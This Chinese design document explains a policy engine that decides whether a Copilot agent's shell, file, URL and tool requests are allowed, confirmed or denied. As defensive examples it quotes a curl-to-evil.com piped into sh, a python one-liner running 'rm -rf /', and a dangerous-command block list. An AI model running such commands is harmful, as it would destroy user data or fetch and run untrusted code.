# Bridge 策略引擎详解

> 本文档覆盖 `apps/bridge/src/policy/` 下的 8 个文件。
> 策略引擎是 Joudo 的安全核心，决定 Copilot 的每个操作是否被允许。

---

## 模块总览

```
policy/
├── index.ts           # 公共 API（重导出）
├── types.ts           # 类型定义
├── constants.ts       # 安全规则集（白名单/黑名单/高危列表）
├── evaluation.ts      # 权限判定引擎（核心逻辑，300+ 行）
├── matching.ts        # 模式匹配（工具/Shell/URL）
├── persistence.ts     # YAML 文件读写
├── shell-candidates.ts # Shell 命令解析与模式提取
└── utils.ts           # 辅助工具函数
```

类比 Python：这个模块相当于一个权限中间件（类似 Django 的 permission classes），但它不只是 RBAC，它是一个完整的命令审计引擎。

---

## 文件详解

### index.ts — 公共 API

纯导出文件，将内部实现统一暴露：

```typescript
// 类型
export type { RepoPolicy, LoadedRepoPolicy, PolicyDecision, PersistedPolicyAllowlistEntry };
// 函数
export { evaluatePermissionRequest };
export { findRepoPolicyPath, initializeRepoPolicy, loadRepoPolicy, persistApprovalToPolicy, removePolicyRule };
```

---

### types.ts — 类型定义

#### RepoPolicy — 策略文件的内存表示

```typescript
type RepoPolicy = {
  version: number;          // 目前固定为 1
  trusted: boolean;         // 是否信任此仓库

  // 工具规则（MCP/自定义工具）
  allowTools: string[];     // 允许的工具模式
  denyTools: string[];      // 拒绝的工具模式
  confirmTools: string[];   // 需要确认的工具模式

  // Shell 命令规则
  allowShell: string[];     // 允许的命令模式
  denyShell: string[];      // 拒绝的命令模式
  confirmShell: string[];   // 需要确认的命令模式

  // 路径规则
  allowedPaths: string[];      // 允许读取的路径
  allowedWritePaths: string[]; // 允许写入的路径

  // URL 规则
  allowedUrls: string[];    // 允许访问的 URL
};
```

类比 Python：
```python
@dataclass
class RepoPolicy:
    version: int = 1
    trusted: bool = False
    allow_shell: list[str] = field(default_factory=list)
    deny_shell: list[str] = field(default_factory=list)
    # ...
```

#### PolicyAction

```typescript
type PolicyAction = "allow" | "confirm" | "deny";
```

#### 6 种权限请求类型

| 类型 | 说明 | 来源 |
|---|---|---|
| ShellPermissionRequest | Shell 命令执行 | Copilot 要在终端执行命令 |
| WritePermissionRequest | 文件写入 | Copilot 要写入/创建文件 |
| ReadPermissionRequest | 文件读取 | Copilot 要读取文件（通常自动允许） |
| UrlPermissionRequest | 网络请求 | Copilot 要访问 URL |
| McpPermissionRequest | MCP 工具调用 | Copilot 要使用 MCP 协议工具 |
| CustomToolPermissionRequest | 自定义工具 | 其他工具调用 |

#### LoadedRepoPolicy — 策略加载状态

```typescript
type LoadedRepoPolicy = {
  state: "loaded" | "missing" | "invalid";  // 加载状态
  path: string | null;                       // 策略文件路径
  config: RepoPolicy;                        // 解析后的策略
  error: string | null;                      // 加载错误信息
};
```

---

### constants.ts — 安全规则集 ⭐

这是安全边界的"字典"，定义了什么是安全的、什么是危险的。

#### 策略文件候选路径

```typescript
const POLICY_CANDIDATES = [
  ".github/joudo-policy.yml",
  ".github/joudo-policy.yaml",
  ".github/policy.yml",
  ".github/policy.yaml",
];
```

#### 安全只读命令

```typescript
const SAFE_READ_ONLY_COMMANDS = new Set([
  "cat", "find", "git", "head", "ls", "pwd", "rg", "sed", "tail", "which"
]);
```

这些命令在仓库内执行时自动允许（不需要用户确认）。

#### 高危解释器

```typescript
const HIGH_RISK_INTERPRETERS = new Set([
  "bash", "node", "python", "python3", "ruby", "sh", "zsh"
]);
```

这些是通用脚本解释器，可以执行任意代码。除非策略明确允许，否则 **默认拒绝**。

为什么 `python` 是高危？因为 `python -c "import os; os.system('rm -rf /')"` 可以做任何事。

#### 危险命令模式

```typescript
const DANGEROUS_COMMAND_PATTERNS = [
  "git push",
  "git reset --hard",
  "gh pr merge",
  "rm",
  "sudo",
  "ssh",
  "scp",
  "rsync",
  "osascript",     // macOS 脚本引擎，可以控制系统
];
```

#### 其他规则集

| 常量 | 用途 |
|---|---|
| GIT_OPTIONS_WITH_VALUE | git 命令中需要跟参数值的 flag（如 `-C path`） |
| PACKAGE_MANAGER_OPTIONS_WITH_VALUE | pnpm/npm 中需要跟参数值的 flag |
| VERSION_QUERY_EXECUTABLES | 版本查询命令（如 `node --version`），安全自动允许 |
| PACKAGE_MANAGER_SCRIPT_COMMANDS | 包管理器的脚本命令（如 `pnpm test`、`npm run build`） |

---

### evaluation.ts — 权限判定引擎 ⭐⭐

**这是策略系统的核心，300+ 行。**

#### 主入口

```typescript
export function evaluatePermissionRequest(
  request: PermissionRequest,
  policy: LoadedRepoPolicy,
  repoRoot: string,
): PolicyDecision {
  // 根据 request.kind 分发到对应评估器
  switch (request.kind) {
    case "shell": return evaluateShellRequest(request, policy, repoRoot);
    case "write": return evaluateWriteRequest(request, policy, repoRoot);
    case "read":  return evaluateReadRequest(request, policy, repoRoot);
    case "url":   return evaluateUrlRequest(request, policy);
    case "mcp":   return evaluateMcpOrCustomToolRequest(request, policy);
    default:      return evaluateMcpOrCustomToolRequest(request, policy);
  }
}
```

#### evaluateShellRequest — Shell 命令评估（最复杂）

```
输入: "git push origin main"
  │
  ├─ 1. 检查 denyShell → 匹配 → 直接拒绝
  │
  ├─ 2. 是否是安全只读命令？
  │     "git" ∈ SAFE_READ_ONLY_COMMANDS → 检查子命令
  │     "git push" 不是只读 → 继续
  │
  ├─ 3. 是否是高危解释器？
  │     "git" ∉ HIGH_RISK_INTERPRETERS → 继续
  │
  ├─ 4. 是否在 allowShell 中？
  │     "git push" ∈ allowShell → 匹配
  │     但! 检查是否是复杂命令（含管道|分号;）
  │     "git push origin main" 无复杂表达式 → 自动允许
  │
  └─ 5. 检查 confirmShell → 需要用户确认
```

**复杂命令检测**：

即使命令在 allowShell 中，如果包含管道 `|` 或分号 `;`，仍然需要 confirm。
原因：`git log | xargs rm` 看起来包含 `git log`（安全），但实际执行了 `rm`（危险）。

**路径安全检查**：

```typescript
// Shell 命令中的路径如果超出仓库范围，需要确认
if (pathEscapesRepo(commandPaths, repoRoot)) {
  return { action: "confirm", reason: "命令涉及仓库外路径" };
}
```

#### evaluateWriteRequest — 写入评估

```
输入: 写入 "src/main.ts"
  │
  ├─ 1. 默认: 写入是限制性的
  ├─ 2. 路径在 allowedWritePaths 中？
  │     "src/" ∈ allowedWritePaths → 允许
  ├─ 3. 路径超出仓库？ → 拒绝
  └─ 4. 其他 → confirm
```

写入比读取严格得多：
- 读取：仓库内默认允许
- 写入：必须在 `allowedWritePaths` 白名单中才自动允许

#### evaluateReadRequest — 读取评估

```
输入: 读取 "src/config.ts"
  │
  ├─ 仓库内？ → 自动允许
  └─ 仓库外？ → 需要确认
```

#### evaluateUrlRequest — URL 评估

```
输入: 访问 "https://api.github.com/repos/..."
  │
  ├─ URL 在 allowedUrls 中？
  │   "https://api.github.com" ∈ allowedUrls → 允许
  └─ 不在？ → 默认拒绝
```

URL 默认 **拒绝**（而非 confirm），因为网络请求可能泄露信息。

#### evaluateMcpOrCustomToolRequest — 工具评估

```
输入: 调用 "mcp:filesystem/readFile"
  │
  ├─ 检查 denyTools → 拒绝
  ├─ 检查 allowTools → 允许
  ├─ 检查 confirmTools → 确认
  └─ 默认: 只读 MCP → confirm, 其他 → confirm
```

---

### matching.ts — 模式匹配

#### matchToolDecision — 工具规则匹配

```typescript
function matchToolDecision(
  request: PermissionRequest,
  policy: RepoPolicy,
): PolicyAction | null {
  // 生成候选模式: ["mcp", "mcp:filesystem/readFile"]
  // 按优先级检查: deny → allow → confirm
  // 返回第一个匹配的 action，或 null（无匹配）
}
```

#### matchShellDecision — Shell 规则匹配

```typescript
function matchShellDecision(
  commandText: string,
  policy: RepoPolicy,
): PolicyAction | null {
  // 解析命令为候选模式: 
  //   "git push origin main" → ["git push origin main", "git push", "git"]
  // 按优先级检查: deny → allow → confirm
}
```

#### matchAllowedUrl — URL 匹配

```typescript
function matchAllowedUrl(url: string, allowedUrls: string[]): boolean {
  // 支持两种匹配:
  // 1. 主机名匹配: "registry.npmjs.org" 匹配 "https://registry.npmjs.org/any/path"
  // 2. 完整 URL 前缀匹配: "https://api.github.com" 匹配 "https://api.github.com/repos/..."
}
```

---

### persistence.ts — YAML 读写

#### 加载策略

```typescript
export function loadRepoPolicy(rootPath: string): LoadedRepoPolicy {
  // 1. 在 POLICY_CANDIDATES 路径中搜索策略文件
  // 2. 读取 YAML 内容
  // 3. parsePolicyDocument() 解析 + 验证
  // 4. 返回 { state: "loaded", path, config, error: null }
  //    或 { state: "invalid", path, config: defaults, error: "解析错误" }
  //    或 { state: "missing", path: null, config: defaults, error: null }
}
```

#### 初始化策略

```typescript
export function initializeRepoPolicy(
  rootPath: string,
  options?: { trusted?: boolean },
): { policy: LoadedRepoPolicy; path: string; created: boolean } {
  // 如果已存在 → 直接加载
  // 如果不存在 → 创建 .github/joudo-policy.yml 包含推荐默认值
}
```

默认策略的内容：
```yaml
version: 1
trusted: false
allowShell:
  - "git status"
  - "git diff"
  - "git log"
allowedPaths:
  - "."
allowedWritePaths:
  - "."
```

#### 持久化审批

```typescript
export function persistApprovalToPolicy(
  rootPath: string,
  policy: LoadedRepoPolicy,
  entry: PersistedPolicyAllowlistEntry,
): LoadedRepoPolicy {
  // 1. 读取现有 YAML
  // 2. 将新规则追加到对应字段（如 allowShell）
  // 3. 重写 YAML 文件
  // 4. 返回更新后的策略
}
```

#### 删除规则

```typescript
export function removePolicyRule(
  rootPath: string,
  policy: LoadedRepoPolicy,
  field: string,   // "allowShell" | "allowedPaths" | "allowedWritePaths"
  value: string,   // 要删除的值
): { policy: LoadedRepoPolicy; removed: boolean; trackedPath: string } {
  // 1. 读取 YAML
  // 2. 从指定字段移除匹配的值
  // 3. 重写文件
  // 4. 返回更新后的策略
}
```

#### YAML 解析和序列化

```typescript
function parsePolicyDocument(content: string): RepoPolicy {
  // YAML → JavaScript 对象 → 验证字段类型 → 返回 RepoPolicy
  // 未知字段被忽略（向前兼容）
  // 缺失字段使用默认空数组
}

function serializePolicyDocument(policy: RepoPolicy): string {
  // RepoPolicy → YAML 字符串
  // 键名转为 snake_case（allow_shell, deny_shell...）
  // 使用 yaml 库的格式化输出
}
```

---

### shell-candidates.ts — Shell 命令解析 ⭐

这个文件负责将用户的原始 Shell 命令解析为可复用的策略模式。

#### 核心问题

当用户批准 `git push origin main`，应该记住什么？
- 精确命令 `git push origin main`？太窄，下次 `git push origin dev` 又要审批
- 通用命令 `git push`？更好，涵盖所有 push 操作
- 可执行文件 `git`？太宽，连 `git reset --hard` 也允许了

#### buildCanonicalShellCandidates

```typescript
export function buildCanonicalShellCandidates(commandText: string): string[] {
  // 输入: "git push origin main"
  // 输出: ["git push origin main", "git push", "git"]
  
  // 输入: "pnpm test --watch"
  // 输出: ["pnpm test --watch", "pnpm test", "pnpm"]
  
  // 输入: "python3 -m pytest tests/"
  // 输出: ["python3 -m pytest tests/", "python3 -m pytest", "pytest", "python3"]
}
```

**特殊处理**：

| 命令类型 | 解析策略 |
|---|---|
| git 子命令 | `git push` → `["git push", "git"]` |
| python -m | `python3 -m pytest` → `["pytest", "python3"]` |
| 包管理器脚本 | `pnpm test` → `["pnpm test", "pnpm"]` |
| 管道命令 | 只分析第一个命令（管道前的部分） |

#### selectPersistedShellPattern

```typescript
export function selectPersistedShellPattern(candidates: string[]): string {
  // 选择最合适的模式写入策略文件
  // 优先选 "命令 子命令" 级别（如 "git push"）
  // 避免太精确（"git push origin main"）或太宽泛（"git"）
}
```

#### tokenizeShellCommand

```typescript
export function tokenizeShellCommand(command: string): string[] {
  // 输入: 'echo "hello world" && ls -la'
  // 输出: ["echo", "hello world", "&&", "ls", "-la"]
  //
  // 规则:
  // - 引号内的空格保留
  // - 反斜杠转义保留
  // - 遇到管道|、分号;、&&、|| 时停止（只分析第一个命令）
}
```

---

### utils.ts — 辅助工具

| 函数 | 用途 |
|---|---|
| `isRecord(value)` | 类型守卫：是否为普通对象 |
| `readStringArray(obj, key)` | 安全读取字符串数组字段 |
| `readBoolean(obj, key, fallback)` | 安全读取布尔字段 |
| `normalizeWhitespace(str)` | 规范化空白字符 |
| `isWithinPath(child, parent)` | 判断路径是否在父目录内（symlink 感知） |
| `resolveAgainstRepo(path, repoRoot)` | 将相对路径解析为绝对路径 |
| `findNearestExistingPath(path)` | 向上查找最近的已存在路径 |
| `skipLeadingAssignments(tokens)` | 跳过 Shell 命令前的环境变量赋值 |
| `findPositionalToken(tokens)` | 找到第一个非选项 token |

---

## 策略评估完整流程图

```
Copilot 请求: "执行 shell: pnpm test --coverage"
  │
  ▼
evaluatePermissionRequest(request, policy, repoRoot)
  │
  ├─→ evaluateShellRequest()
  │
  ├─ Step 1: matchShellDecision() → 检查 deny/allow/confirm 列表
  │   │
  │   ├─ buildCanonicalShellCandidates("pnpm test --coverage")
  │   │   → ["pnpm test --coverage", "pnpm test", "pnpm"]
  │   │
  │   ├─ 检查 denyShell: 无匹配 → 继续
  │   ├─ 检查 allowShell: "pnpm test" 匹配！ → action = "allow"
  │   └─ 返回 "allow"
  │
  ├─ Step 2: 复杂命令检查
  │   "pnpm test --coverage" 没有管道|分号 → 通过
  │
  ├─ Step 3: 路径检查
  │   没有涉及仓库外路径 → 通过
  │
  └─ 最终结果: { action: "allow", reason: "匹配 allowShell: pnpm test" }
```

```
Copilot 请求: "执行 shell: bash -c 'curl http://evil.com | sh'"
  │
  ▼
evaluateShellRequest()
  │
  ├─ Step 1: matchShellDecision() → 无匹配
  │
  ├─ Step 2: 高危解释器检查
  │   "bash" ∈ HIGH_RISK_INTERPRETERS → 拒绝!
  │
  └─ 最终结果: { action: "deny", reason: "高危解释器 bash 需要明确允许" }
```

```
Copilot 请求: "访问 URL: https://unknown-api.com/data"
  │
  ▼
evaluateUrlRequest()
  │
  ├─ matchAllowedUrl("https://unknown-api.com/data", allowedUrls)
  │   没有匹配的 URL → false
  │
  └─ 最终结果: { action: "deny", reason: "URL 不在允许列表中" }
```
